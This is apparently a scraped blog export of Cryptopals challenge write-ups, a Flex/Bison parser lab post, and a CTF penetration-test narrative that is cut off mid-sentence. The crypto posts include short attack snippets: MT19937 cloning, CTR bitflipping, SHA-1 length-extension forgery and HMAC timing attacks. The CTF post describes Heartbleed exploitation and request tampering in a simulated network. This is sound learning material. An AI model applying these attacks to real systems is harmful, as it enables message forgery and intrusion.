12345678def untemper(val): val = unRightShiftXor(val, 18) val = unLeftShiftXorAnd(val, 15, 4022730752) val = unLeftShiftXorAnd(val, 7, 2636928640) val = unRightShiftXor(val, 11) and we can easily clone an RNG‚Äôs 624-value state: 123for i in xrange(624): rand = mt.get_number() cloned_mt_state[i] = untemper(rand) We check that a MT with the cloned state does in fact generate the same numbers as the original MT. Done! 12cloned_mt = MT19937(arbitrary value)cloned_mt.state = cloned_mt_state Challenge 24 Create the MT19937 stream cipher and break it We first need to create an MT19937 stream cipher, which operates much like CTR mode. The keystream, the RNG output, is simply XORed to decrypt or encrypt. We have an oracle that appends some random prefix to our plaintext before encrypting it using the MTR Stream cipher. We first find the prefix length, by simply subtracting the length of the plaintext from the len of oracle-returned ciphertext ‚Äî the added length in the ciphertext must be due to the prefix, since there‚Äôs no padding in a stream cipher. 12345678910111213141516171819Step 1:plaintext:AAAAAAAAAAAAAAencrypted in oracle:|rand_prefix|| |RRRRRR AAAAAAAAAAAAAA|len(oracle_ciphertext)|Step 2:padded:|prefix_len|| |AAAAAA AAAAAAAAAAAAAA|len(oracle_ciphertext)| |-COMPARE ENC-| We then iterate through all possible seed values, 1‚Ä¶216. We create a MT Cipher with each seed, encrypting our padded data and seeing if it gives the same ciphertext as the oracle did. (Remember to slice out the random prefix when comparing!) If the ciphertexts match, we have found our seed! 1234for i in xrange(2**16): padded = 'A' * len(oracle_ciphertext) if MT19937Cipher(i).encrypt(padded)[prefix_len:] == oracle_ciphertext[prefix_len:]: return i","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Matasano Crypto Challenges, Set 4","slug":"set4-writeup","date":"2017-03-07T15:38:11.000Z","updated":"2017-12-27T22:53:54.000Z","comments":true,"path":"2017/03/07/set4-writeup/","link":"","permalink":"http://raywang.tech/2017/03/07/set4-writeup/","excerpt":"Challenge 25 Break ‚Äúrandom access read/write‚Äù AES CTR Because we can seek into the ciphertext and edit arbitrary characters, we we can simply guess each plaintext character. For each byte in the ciphertext, I can try all 256 characters by replacing the ciphertext byte with my encrypted guess using the provided edit() function. If the new ciphertext exactly matches the original ciphertext, then I know my guess for the plaintext character is correct, since it encrypted to the same byte. 123456for i in xrange(len(ciphertext)): for c in candidates: new_ciphertext = edit(ciphertext, i, c) if new_ciphertext[i] == ciphertext[i]: result += c","text":"Challenge 25 Break ‚Äúrandom access read/write‚Äù AES CTR Because we can seek into the ciphertext and edit arbitrary characters, we we can simply guess each plaintext character. For each byte in the ciphertext, I can try all 256 characters by replacing the ciphertext byte with my encrypted guess using the provided edit() function. If the new ciphertext exactly matches the original ciphertext, then I know my guess for the plaintext character is correct, since it encrypted to the same byte. 123456for i in xrange(len(ciphertext)): for c in candidates: new_ciphertext = edit(ciphertext, i, c) if new_ciphertext[i] == ciphertext[i]: result += c My main gripe is that this program is veryyy slow and I‚Äôm not sure where the slowdown comes from, but I‚Äôm not concerned with optimising right now. Challenge 26 CTR bitflipping CTR is susceptible to an even simpler bitflipping attack than CBC. I can simply send in the payload string as before '\\x00admin\\x00true\\x00', which will be inserted between &quot;&quot;comment1=cooking%20MCs;userdata=&quot; &quot; and &quot;;comment2=%20like%20a%20pound%20of%20bacon&quot; and encrypted. I can modify the ciphertext for the block-of-interest directly ‚Äî I don‚Äôt even need the previous ciphertext block as in CBC! 123ciphertext[32] = chr(ord(ciphertext[32]) ^ 59)ciphertext[38] = chr(ord(ciphertext[38]) ^ 61)ciphertext[43] = chr(ord(ciphertext[43]) ^ 59) will XOR in the ASCII codes for ; and =, so when CTR decryption XORs this ciphertext against the keystream, the desired characters will be left. Challenge 27 Recover the key from CBC with IV=Key Apparently, using the key as an IV is insecure, if an attacker can modify the ciphertext in-flight. The challenge instructs us to: 1234567891011Use your code to encrypt a message that is at least 3 blocks long:AES-CBC(P_1, P_2, P_3) -&gt; C_1, C_2, C_3Modify the message (you are now the attacker):C_1, C_2, C_3 -&gt; C_1, 0, C_1Decrypt the message (you are now the receiver) and raise the appropriate error if high-ASCII is found.As the attacker, recovering the plaintext from the error, extract the key:P'_1 XOR P'_3 Why does this work? Well, by inserting all \\x00‚Äòs‚Äô in block 2, when we CBC decrypt block 3 of C‚Äô, we recover the intermediate state of C_1, since we XOR with all \\x00. We also have the plaintext of C_1 in the first block. So, we can simply recover the IV by XORing the plaintext with the intermediate state. 123P'_3 ^ IV = P'_1IV = P'_1 ^ P'_3 Challenge 28 Implement a SHA-1 keyed MAC The way a MAC works is described in this diagram off wikipedia: We run the message through the HMAC algo, and send both the message and MAC digest to the receiver. The receiver must verify that the message he received has not been tampered by running it through the same MAC algo, and checking it against the MAC digest he received. In this case, our HMAC algo is just secret-prefix, SHA1(key || message). I borrow a SHA1 implementation from https://github.com/ajalt/python-sha1. The authsha1(key, data) function produces the MAC digest, and validate_oracle(key, message, digest) checks that the MAC digest of message matches digest. Challenge 29 Break a SHA-1 keyed MAC using length extension This is a cool attack. Here‚Äôs a general idea of how SHA-1 works: SHA1 operates on padded data. The RFC explains the padding scheme as follows: The purpose of message padding is to make the total length of a padded message a multiple of 512. SHA-1 sequentially processes blocks of 512 bits when computing the message digest. ‚Äò1‚Äô is appended to message. '0‚Äôs are appended, depending on the original length of the message. Leave space for two 4-byte words at the end, so bring up the message to 448 bits (56 bytes). We can do that with 1message += b'\\x00' * ((56 - (message_byte_length + 1) % 64) % 64) If the message is already &gt;56, Append the 2-word representation of len(message). If the message is 40 bytes long, The two-word representation of 40 is hex 00000000 00000028. There are five internal state variables, h0, h1, h2, h3, h4. These are concatenated to give the final digest. The h‚Äôs are initialized to 123450x67452301,0xEFCDAB89,0x98BADCFE,0x10325476,0xC3D2E1F0, Then, each chunk is processed and the h‚Äôs are updated as follows: Split the 64-byte chunk into 16 4-byte words Populate a word_array of size 80 with the 16 words, and then 64 more generated values. Let A = H0, B = H1, C = H2, D = H3, E = H4. Do 80 rounds of transformations on a, b, c, d, e. Finally, update the internal digests H0 = H0 + A, H1 = H1 + B, H2 = H2 + C, H3 = H3 + D, H4 = H4 + E. So, when update() is called in authsha1, the internal states (the h‚Äôs) are updated for every full 64-byte block, leaving the leftovers in self._unprocessed. Then, digest() is called, to pad the leftovers to 64 or 128 bytes, and do the last 1 or 2 internal state updates, returning the concatenated h‚Äôs as the digest. The attack The attack will mean I am able to successfully append some data to the message and create a forged digest, such that the receiver will think that I generated the digest by knowing the key and accept the message as untampered. The steps for forging a digest are: I need to guess the length of the key so that my message will have the correct padding. Split the SHA1 digest of the true message into 5 pieces, which will be passed as h0, h1, h2, h3, h4 to a new SHA1. For each guess for the keylength, prepend key padding to the original message and append SHA1 padding. 12|keylen_guess|AAAAAAAAAAAAAA orig_message \\x01\\x00\\x00... Pass in the internal state variables and the length of the padded message to a new SHA1, telling the algorithm how many bytes have been processed so far(message_byte_length) and the current state. Update the SHA1 with the extension data, getting a forged digest. We‚Äôre essentially forging the digest for: 12|keylen_guess|AAAAAAAAAAAAAA orig_message \\x01\\x00\\x00... ;admin=true Now, remove the key padding from the extended message, leaving the forged message: 1orig_message \\x01\\x00\\x00... ;admin=true Send this and its forged digest to the receiver to be verified. The receiver will prepend the key to this message and calculate the digest. When we guess the correct keylen, the padding we‚Äôve added to the orig_message block will be correct, and the SHA1 will continue by hashing the next block, ;admin=true, and find that the digest is the same as our forged one. 1234padded_plaintext_no_key = padded_plaintext_with_key_extension[keylen_guess:]if validate_oracle(key, padded_plaintext_no_key, forged_digest): print \"Found keylen_guess\", keylen_guess I successfully created a forged digest for the message comment1=cooking%20MCs;userdata=foo;comment2=%20like%20a%20pound%20of%20bacon\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x98;admin=true that the receiver validates! Challenge 30 Break an MD4 MD5 keyed MAC using length extension I decided I like MD5 better than MD4, and there‚Äôs more implementations out there. MD5 is susceptible to the same length extension attack as above because it follows the MD construction, which includes padding and the fact that the output of the hash gives all the state needed to continue, or extend, the hash. Here‚Äôs how MD5 works: The padding scheme is very similar to SHA-1 ‚Äî the only difference being that the length is added on as big-endian packed instead of little-endian packed. There are four internal state variables - A, B, C, D, each 32 bits. These are initialized to 1234word A: 01 23 45 67word B: 89 ab cd efword C: fe dc ba 98word D: 76 54 32 10 We also use a table of 64 values generated from the sine function, self.k. For each chunk, which is 512 bits, we unpack into 16 words of 32-bits. Then, we do 64 transforms, split into four rounds. each transform taking: an incrementing-by-one index into the sin table, a function f specific to the round, a lrot value, and an index into our array of 16 words. At the end of each transform, the ABCD values are updated as follows: 1a, b, c, d = d, x &amp; 0xffffffff, b, c where x is the result of the transform. The message digest produced as output is the concat of A, B, C, D, 128 bits, or 16-bytes in length. I use the implementation at https://github.com/FiloSottile/crypto.py/blob/master/2/md5.py, but it needs to be extended in several ways for this challenge. The implementation must allow the caller to set the internal state variables so that I can continue the hash. I add 12345678if state_array: self.A = state_array[0] self.B = state_array[1] self.C = state_array[2] self.D = state_array[3] else: #initial magic self.A, self.B, self.C, self.D = (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476) The implementation also must allow the caller to specify how many bytes have been processed so far, the message_byte_length option above. Challenge 31 Implement and break HMAC-SHA1 with an artificial timing leak I use Tornado as my web framework. I take in a file and signature URL param, and implement an insecure_compare function that converts the values to ascii, then byte-by-byte compares, adding a timing delay of 50ms. I iterate through all possible bytes, making a request with my known bytes + byte_guess + padding. I simply take the maximum delay each time, which would occur when I‚Äôve guessed the byte correctly, causing another sleep of 50ms, for an added delay of 100ms. Challenge 32 Break HMAC-SHA1 with a slightly less artificial timing leak When I have such a small timing leak (5ms), network delays make the previous exploit unreliable. I need to normalize over multiple runs (I choose 10) to be able to tell whether the maximum is indeed the correct HMAC byte.","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Flex and Bison for a Simple Language, MITScript","slug":"Flex-and-Bison-for-a-simple-language-MITScript","date":"2017-03-07T15:38:11.000Z","updated":"2017-09-29T19:20:01.000Z","comments":true,"path":"2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/","link":"","permalink":"http://raywang.tech/2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/","excerpt":"For the first lab in 6.035, Computer Language Engineering, in Spring 2017, we use Flex, a lexical analyzer library, and Bison, a parser generator, to create a parser for a simple scripting language. The grammar for the language is shown below.","text":"For the first lab in 6.035, Computer Language Engineering, in Spring 2017, we use Flex, a lexical analyzer library, and Bison, a parser generator, to create a parser for a simple scripting language. The grammar for the language is shown below. 12345678910111213141516171819202122Program ::= Statement*Statement ::= Assignment | CallStatement | Global | IfStatement | WhileLoop | ReturnGlobal ::= 'global' name ';'Assignment ::= LHS '=' Expression ';'CallStatement ::= Call ';'Block ::= '&#123;' Statement* '&#125;'IfStatement ::= 'if' '(' Expression ')' Block ( 'else' Block )?WhileLoop ::= 'while' '(' Expression ')' BlockReturn ::= 'return' Expression ';'Expression ::= Function | Boolean | RecordFunction ::= 'fun' '(' Name* ')' BlockBoolean ::= Conjunction ( '|' Conjunction )*Conjunction ::= BoolUnit ('&amp;' BoolUnit)*BoolUnit ::= '!'? PredicatePredicate ::= Arithmetic ( ('&lt;' | '&gt;' | '&lt;=' | '&gt;='| '==') Arithmetic)?Arithmetic ::= Product ( ('+' | '-') Product)*Product ::= Unit ( ('*' | '/') Unit)*Unit ::= '-'? (LHS | Constant | Call | '(' Boolean ')' )LHS ::= Name ('.' Name | '[' Expression ']' )*Call ::= LHS '(' (Expression (',' Expression)*)? ')'Record ::= '&#123;' (Name ':' Expression ';')* '&#125;'Constant ::= integer_constant | string_constant The goal is to construct an Abstract Syntax Tree (AST) for any MITScript program and pretty-print it. 123456789101112131415161718Your parser must produce an AST with nodes for the following program constructs:Block ::= [Statement]Global ::= nameAssignment ::= LHS ExpressionExpressionStatement ::= Expression ';'IfStatement ::= Condition ThenPart ElsePartWhileLoop ::= Condition BodyReturn ::= ExpressionFunctionDeclaration ::= [Arguments] BodyBinaryExpression ::= LeftOperand Operator RightOperandUnaryExpression ::= Operand OperatorFieldDereference ::= BaseExpression FieldIndexExpression ::= BaseExpression IndexCall ::= TargetExpression [Arguments]Record ::= Map[String, Expression]IntegerConstantStringConstantNoneConstant Flex How do Flex and Bison work? Much of the lab was reading documentation about these two old utilities. Flex takes a .lex file, which simply lists the regular expressions, tokens, and keywords that will be matched in a program. When Flex works with Bison, every time it matches a token/keyword, it tells Bison about it. It can return the type of token/keyword to Bison, and it can also return an entire matched string or int in a Bison object it has access to, called yylval. Here are examples of both: 1234567&#123;string_const&#125; &#123; //Rule for string constant yylval-&gt;strType = new string(yytext); return T_STRINGCONST;&#125;\"while\" &#123;return T_WHILE;&#125; For us, the lab specifies that: Your lexer must be able to recognize the following kinds of tokens in addition to all the keywords and operators listed above: integer constants consisting of one or more digits 1int_const [0-9][0-9]* string constants wrapped in double quotes and supporting the following escaped characters: \\ &quot; \\n \\t 1string_const (\\&quot;(\\\\.|[^&quot;])*\\&quot;) None constant, equivalent to ‚ÄúNULL‚Äù in Java ‚Äòtrue‚Äô and ‚Äòfalse‚Äô 123&quot;None&quot; &#123;return T_NONE;&#125;&quot;true&quot; &#123;return T_TRUE;&#125;&quot;false&quot; &#123;return T_FALSE;&#125; Name identifiers that start with a letter or underscore, followed by sequence of letters, underscores and numbers. so x0 is a valid variable name, but 0x is not 12345678identifier ([a-zA-Z_][a-zA-Z_0-9]*)...&#123;identifier&#125; &#123; yylval-&gt;strType = new string(yytext); return IDENTIFIER;&#125; The file is compiled in our Makefile with flex --outfile=lexer.cpp --header-file=lexer.h lexer.lex. Bison In the Bison .yy file, we must define several things. First, we must define the union, types, and tokens that Flex and our grammar know about. Then, we need to define our grammar (the most important part!). The grammar section of the .yy file contains rules created simply by converting our MITScript to Bison syntax (more on this soon). Each rule is associated with an action, which contains C++ code to be executed when the rule is matched. How does this fit into everything else? Well, we have a main.cpp file that will call yyparse on stdin, which will match all the tokens and Bison rules, executing their actions. These actions will construct node objects of an AST, which are defined in AST.h. Then, the main.cpp file will call the pretty print function on the root node, which will recursively print the tree. As an example of a rule + action, 1234returnStmt: T_RETURN expr T_SEMICOLON &#123; $$ = new ReturnStatement(*$2); &#125;; Above, the T_RETURN and T_SEMICOLON are tokens that correspond to ‚Äúreturn‚Äù and ‚Äú;‚Äù in our lex file. The components matched by the rule can be accessed by $n, which stands for the value of the nth component. The semantic value for the grouping being constructed is $$. The ReturnStatement object is an AST node class defined in another file, AST.h, which we‚Äôll get to. But let me go back to the union. ‚ÄúThe %union declaration specifies the entire collection of possible data types for semantic values.‚Äù Lexer can access these union fields in yylval. 12345678910111213%union &#123; int intconst; string *strType; // goes with string_const in lex Block* blockType; Statement* statementType; Expression* expressionType; vector&lt;Expression*&gt; *exprListType; vector&lt;Statement*&gt; *stmtListType; vector&lt;string*&gt; *stringListType; //maybe don't need for function declaration list map&lt;string, Expression*&gt; *recordMapType;&#125; You can see that in my union, I have a bunch of pointers of node types in my AST. I can now define %tokens, which are terminals in my grammar (strings, keywords and ints), and %types, which are nonterminals in my grammar. All the tokens are matched and returned in the .lex file. 123456%token&lt;intconst&gt; T_INT%token&lt;strType&gt; T_SEMICOLON T_LBRACKET T_RBRACKET T_LPAREN T_RPAREN T_AND T_OR T_EXCLAM T_LESS_THAN T_GREATER_THAN T_LEQ T_GEQ T_EQEQ T_PLUS T_MINUS T_TIMES T_DIV T_DOT T_EQUALS T_COLON T_LBRACE T_RBRACE T_COMMA%token &lt;strType&gt; T_FUNCTION T_GLOBAL T_IF T_ELSE T_WHILE T_RETURN T_NONE T_TRUE T_FALSE%token &lt;strType&gt; IDENTIFIER T_STRINGCONST And nonterminals: 1234567891011%type &lt;statementType&gt; stmt assignment callStmt ifStmt whileLoop returnStmt global Program%type &lt;blockType&gt; block%type&lt;stmtListType&gt; stmts%type &lt;expressionType&gt; expr call boolean function conjunction boolunit predicate arithmetic product unit lhs record constant subunit%type&lt;exprListType&gt; argument_expr_list func_declaration_list%type&lt;recordMapType&gt; record_init_list To enforce left-associativity, I add 12%left PLUS MINUS%left TIMES DIV Now for the fun stuff! With all the types I‚Äôve defined, I need to write grammar rules for all of them. 12345678Program: %empty &#123; // printf(\"Empty program\\n\"); &#125; | stmts &#123; $$ = new Program(*$1); out = $$; &#125;; The highest level, the start Program, can be empty. We assign the Program node to out, which is passed to main.cpp through an argument of yyparse. Note that the skeleton code added some extra stuff to make this necessary/possible; namely, it is needed to make the parser reentrant. The skeleton code constructs are explained in this great post. Much of the translation from BNF grammar to Bison is straightforward. But, when creating variable-length lists, such as function arguments(fun(a b c){}), we have to use a C++ vector and recursively push objects into it. 1234567891011argument_expr_list: %empty &#123; $$ = new ExpressionList(); &#125; | expr &#123; $$ = new ExpressionList(); $$-&gt;push_back($1); &#125; | argument_expr_list T_COMMA expr &#123; $1-&gt;push_back($3); &#125;; In the third rule above, the $3 matches the expr, and $1 matches the argument_expr_list, which you recall is of type vector&lt;Expression*&gt;. The same goes for record rules, which are like Python dicts, and are of type map&lt;string, Expression*&gt;: 123456789101112131415record: T_LBRACE record_init_list T_RBRACE &#123; // printf(&quot;Parsing\\n &quot;); $$ = new Record(*$2); &#125;;record_init_list: %empty &#123; // printf(&quot;Parsing empty record\\n &quot;); $$ = new RecordMap(); &#125; | record_init_list IDENTIFIER T_COLON expr T_SEMICOLON &#123; // printf(&quot;Parsing record recursive\\n &quot;); $1-&gt;insert(make_pair(*$2, $4)); &#125;; Note that the default action for a rule is $$ = $1;. Running bison with bison --output=parser.cpp --defines=parser.h -v parser.yy will produce several files, including a parser.output file that contains valuable debugging info about our parser, such as the state transition tables. AST Nodes, Visitor pattern pretty-printing, and main (Or, putting it all together) Here‚Äôs the main.cpp file 12345678910111213int main(int argc, char** argv)&#123; void* scanner; yylex_init(&amp;scanner); yyset_in(stdin, scanner); Statement* output; int rvalue = yyparse(scanner, output); if(rvalue == 1)&#123; cout&lt;&lt;\"Parsing failed\"&lt;&lt;endl; return 1; &#125; PrettyPrinter printer; output-&gt;accept(printer);&#125; Each class in my AST.h inherits from Expression or Statement. 123456789class Call: public Expression &#123;public: Expression&amp; targetExpr; ExpressionList&amp; argumentsList; Call( Expression&amp; targetExpr, ExpressionList&amp; argumentsList): targetExpr(targetExpr), argumentsList(argumentsList)&#123;&#125;; void accept(Visitor&amp; v) override &#123; v.visit(*this); &#125;&#125;; The accept function that overrides a virtual method is part of the Visitor Pattern. Instead of defining a pretty-print method in each of my classes in AST.h, I define a PrettyPrinter class that contains visit(Object&amp; obj) methods for all my nodes. We also need an interface with all our virtual methods in Visitor.h. This diagram explains the Visitor pattern well. My PrettyPrinter.h file has recursive calls to each node‚Äôs accept() method. For example, for a Block, which contains a list of Statements, 123456789101112void visit(Block&amp; blk) override &#123; PrettyPrinter printer; printf(\"&#123;\"); TABLEVEL++; for ( auto statement = blk.statements.begin(); statement != blk.statements.end(); statement++ ) &#123; printf(\"\\n\"); (*statement)-&gt;accept(printer); &#125; printf(\"\\n%s&#125;\", string(TABLEVEL-1,'\\t').c_str()); TABLEVEL--;&#125;; I use a global variable TABLEVEL and printf(&quot;\\n%s}&quot;, string(TABLEVEL-1,'\\t').c_str()); to get the correct indentation for the body elements of the block. When I print, I wrap all BinaryExpressions and UnaryExpressions in parentheses. We can now understand the rest of our Makefile, 123456789all: parser.cpp lexer.cpp main.cpp PrettyPrinter.h Visitor.h g++ -g -std=gnu++11 main.cpp parser.cpp lexer.cppparser.cpp: parser.yy bison --output=parser.cpp --defines=parser.h -v parser.yylexer.cpp: lexer.lex flex --outfile=lexer.cpp --header-file=lexer.h lexer.lex The compiled binary, a.out, will take in a file through a redirect ./a.out &lt; tests/good1.mit and pretty-print! Other references Here is a complete compiler tutorial that is closer to a real language than most things. Most other Flex/Bison examples are stupid calculators x.x. This tutorial is very very thorough. The ANSI C Lex spec and Yacc (old version of Bison) file are helpful in constructing our own grammar and lex rules.","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"6.035","slug":"6-035","permalink":"http://raywang.tech/tags/6-035/"}]},{"title":"Matasano Crypto Challenges, Set 1","slug":"set1_writeup","date":"2017-03-07T15:38:11.000Z","updated":"2017-09-29T19:20:01.000Z","comments":true,"path":"2017/03/07/set1_writeup/","link":"","permalink":"http://raywang.tech/2017/03/07/set1_writeup/","excerpt":"Challenge 1.1 Convert hex to base64 The first challenge is pretty straightforward, using python‚Äôs built-in functions or pwntools, as I use heavily in these challenges. The functions a2b_hex, unhexlify, and ''.decode(&quot;hex&quot;) all do the same thing. They take in an ascii string of the form ‚Äú[0-9a-f]*‚Äù and decode it. The string decodes to I'm killing your brain like a poisonous mushroom. We can then use binascii.b2a_base64() to convert the byte string to a base64 representation.","text":"Challenge 1.1 Convert hex to base64 The first challenge is pretty straightforward, using python‚Äôs built-in functions or pwntools, as I use heavily in these challenges. The functions a2b_hex, unhexlify, and ''.decode(&quot;hex&quot;) all do the same thing. They take in an ascii string of the form ‚Äú[0-9a-f]*‚Äù and decode it. The string decodes to I'm killing your brain like a poisonous mushroom. We can then use binascii.b2a_base64() to convert the byte string to a base64 representation. Challenge 1.2 Fixed XOR This challenge uses iterators to do a fixed-length xor. The chr() function takes an ASCII integer code in the range 0-255 and returns a character string. The ord() function does the inverse, taking a character and returning its integer. We want to xor these integers. Thus, ''.join([chr(ord(i)^ord(j)) for i, j in zip(s1, s2)]) will first xor the integers of each character of the input strings with ord(). Then it will convert back into a character string with chr(). Challenge 1.3 Single-byte XOR cipher Extending the last challenge, we can create a variable-length input xor function. Or, we can use pwntools xor(). I iterate through all 255 possible single character xor keys, scoring each decrypted word based on character frequency. 123456for c in result: c = c.lower() if c in character_frequency: word_score += character_frequency[c]cand_words.append((result, word_score, char)) Challenge 1.4 Detect single-character XOR This challenge asks us to find which of the 60-character strings in the file has been encrypted by single-character XOR. Using the find_singlechar_key_xor utility function created in the last challenge, I can iterate through all the file strings and find the possible single-character xor key and word score of each line. The line turns out to decode to ‚ÄòNow that the party is jumping\\n‚Äô, xored against the byte 5. Challenge 1.5 Implement repeating-key XOR This is a cop-out. Pwntools implements repeating-key xor in its utils.fiddling library. We can use python itertools for this as well, 1return ''.join([chr(ord(i)^ord(j)) for i, j in it.izip(s1, it.cycle(s2))]) Challenge 1.6 Break repeating-key XOR This challenge asks us to solve repeating-key xor, aka the Vigenere cipher. There are several steps to doing this. First, we need to find the xor key length. the period of the cipher. Next, we need to find the key character-by-character, using the single-byte xor cipher we made in Challenge 1.3. In the first step I calculate the Hamming distance (number of diff bits between two strings) of two consecutive ciphertext blocks (of some guessed length). The correct keylength will create blocks of minimum Hamming distance. The challenge tells us to try values from 2 to 40 for the guessed key length. I calculate the hamming distance of all combinations of 4 blocks. 12pairs = list(it.combinations(blocks, 2))hamsum = it.starmap(hamming, pairs) it.starmap computes the hamming function using arguments obtained from the iterable pairs. I then normalize the Hamming distance for keysize. 1normalized = float(reduce(lambda x, y: x+y, hamsum))/keysize and find the keylength with the minimum normalized hamming distance is 29. The second step is to find the key, character-by-character. I split the ciphertext into blocks of len(keysize) and transpose them, so that I have a list of all the 1st, 2nd, etc‚Ä¶ chars of each block. Each of these transposed messages has been single-char xored, so I can just find each single-char key and concatenate the chars to get the full xor key. 12345678blocks = [x[i:i+keysize] for i in range(0, len(x), keysize)]blocks = it.izip_longest(*blocks, fillvalue='0')block_list = [''.join(msg) for msg in blocks]char_freqs = [find_singlechar_key_xor(''.join(msg))[2]for msg in block_list] I need to use izip_longest because the last block is shorter than the others, and izip_longest pads the shortest elements of the iterable. The key made by joining the single-char keys is Terminator X: Bring the noise. Challenge 1.7 AES in ECB mode This challenge introduces the AES block cipher and the ECB mode. The ECB mode is problematic because it is stateless and deterministic ‚Äî the same block of plaintext will encrypt to the same ciphertext. I use the cryptography module in Python because it‚Äôs being actively developed, although the PyCrypto library is more popular. You initialize AES, a symmetric cipher, with 1cipher = Cipher(algorithm = algorithms.AES(\"YELLOW SUBMARINE\"), mode = modes.ECB(), backend=default_backend()) . To decrypt text, you use a decryptor object and the update() and finalize() methods. 12d = cipher.decryptor()decrypted_text = d.update(file) + d.finalize() Challenge 1.8 Detect AES in ECB mode Because ECB is deterministic, I can detect which of the strings in 8.txt is encrypted using ECB. The properties of the plaintext, such as low Hamming distance, will remain in the ciphertext. Thus, I can use minimum Hamming distance to find the correct line, similar to Challenge 6. I create a scoring function, hamming_score_line(line), which will return the hamsum of a line of ciphertext. 1min_line_num = min(lines, key=hamming_score_line)[0] will be the correct answer, 133. References [1] pwntools","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"NSA Cybersprint 2015","slug":"NSA-Cybersprint-2015","date":"2015-12-12T22:38:28.000Z","updated":"2017-09-29T19:20:01.000Z","comments":true,"path":"2015/12/12/NSA-Cybersprint-2015/","link":"","permalink":"http://raywang.tech/2015/12/12/NSA-Cybersprint-2015/","excerpt":"This is my first writeup, written in 2015 in Word and back-dated Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corporate network infrastructure. Here‚Äôs what it was like.","text":"This is my first writeup, written in 2015 in Word and back-dated Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corporate network infrastructure. Here‚Äôs what it was like. I‚Äôm in the position of a penetration tester who‚Äôs been hired to probe the major pharmaceutical company, BWP, for vulnerabilities. In five levels of increasing difficulty, I must explore and exploit an array of BWP‚Äôs internal sites. I‚Äôm testing an extensive set of abilities, including command-line savvy and knowledge of vulnerabilities and hacking tools. But what‚Äôs going to help me most is creative problem-solving. As in the real world, there are a lot of unexpected obstacles that complicate break-ins, but inventing workarounds is key to the sport. I use the Kali Linux distribution as my hacking box, which comes with a massive suite of pentesting tools pre-installed. Booting off an external drive with Kali installed, I have a hacker‚Äôs playground. On Level 1, I‚Äôm given access to our company‚Äôs webmail service and internal social network with the credentials of an unprivileged user. I‚Äôll need to leverage this network throughout my investigation to be able to know which employees work for which teams. Without needing too much technical know-how, I navigate around the directory webpages, picking up information about the organization‚Äôs users and teams (called ‚ÄòSpaces‚Äô). I notice there‚Äôs a Sales space, an IT admin space, and a Patent space, among others. In a cute little warmup, I‚Äôm asked to craft a social-engineering attack ‚Äî email a manager asking for a list of patent-holders and their patents in the most innocent way possible. Of course, only a bot responds to me, but this highlights a low-hanging fruit in real life ‚Äî human beings are often the weakest link in a company‚Äôs security chain. A dozen small checkpoints later, I‚Äôm on Level 2. There‚Äôs a secret IT-only staff page that I need to get access to. As it turns out, only IT staff members can get the password to this site, by requesting the credentials from an online portal. So I log in to the portal as my unprivileged self and notice there‚Äôs an online form with my username in an uneditable input field. I tweak the page source to impersonate an IT staff member, send the form, and get an automated response with the IT-only login. Nothing fancy yet, just using the Page Inspector, which is built into browsers like Firefox and Chrome. It‚Äôs contrived, sure, but we‚Äôre only on Level 2! I login to the secret page. Now, I‚Äôm staring at the IT dashboard and a big list of tickets. Let‚Äôs look at the most recent ticket ‚Äî it has to do with a closed-circuit TV (CCTV) server. But there‚Äôs a problem ‚Äî ticket details are restricted to IT staff members, and I don‚Äôt have the credentials of any. Kali Linux comes with the Burp Suite, which has a host of capabilities for testing web applications. Setting up a proxy between Burp and the webpage, I can view all the requests and responses that are being sent back and forth, and I can change the contents before sending them along. To do this, I configure my browser to forward connections to Burp‚Äôs proxy port and turn on Burp‚Äôs ‚Äòintercept‚Äô feature. To view ticket details, it looks like I need to change this show_details parameter in the HTTP GET request to true. I use Burp to intercept my browser‚Äôs request to the web page, replacing the parameter and then forwarding the request along. The server, seeing this edited request, displays the details: ‚ÄúCVE-2014-0160‚Äù. What‚Äôs this? It‚Äôs a vulnerability in the OpenSSL library commonly known as Heartbleed, which is classified as a ‚Äòbuffer-overread‚Äô. This bug in a critical library for secure communications got a lot of attention in 2014 because it compromised hundreds of millions of secure web servers. When one machine on a secure channel tries to ask another if it‚Äôs still alive, it‚Äôs called the ‚Äòheartbeat‚Äô protocol. One side sends a payload length and payload to the other side, which reads the payload and sends it back. But, if the payload length is greater than the payload data, the responding machine will read back not just the payload, but also anything in memory stored beyond the payload data. This is due to a faulty bounds-check that doesn‚Äôt check whether the ‚Äòpayload length‚Äô value is actually correct. The penetration testing command-line tool Metasploit comes with a Heartbleed scanner pre-installed. A few inputs and an exploit command later, I‚Äôve leaked the CCTV server‚Äôs memory and discovered a password in the leak. Now, I can log in and view video camera feeds. Level 2 is complete. Rolling right along, I now move to Level 3 in which I break into the sales team. I try to log in to the sales submission website, but I‚Äôm not a sales staff member, so no luck. It‚Äôs time to whip out Burp again to forge some parameters and masquerade as sales. This time, I replace a user parameter in my browser request with the username of a sales team member. It works. On the sales submission site, I notice an error log file, which naively has a set of customer credentials buried in it. With these credentials, I can get onto the Customer Relationship Management (CRM) portal. Now my SQL skills are put to the test. There‚Äôs a ‚ÄòSales Analysis‚Äô table on this site, whose backend is a MySQL database. It‚Äôs got a list of drug sales to different buyers and their associated dollar amounts. Some of the entries are hidden ‚Äî some buyers are ‚Äòrestricted‚Äô, and I can‚Äôt see 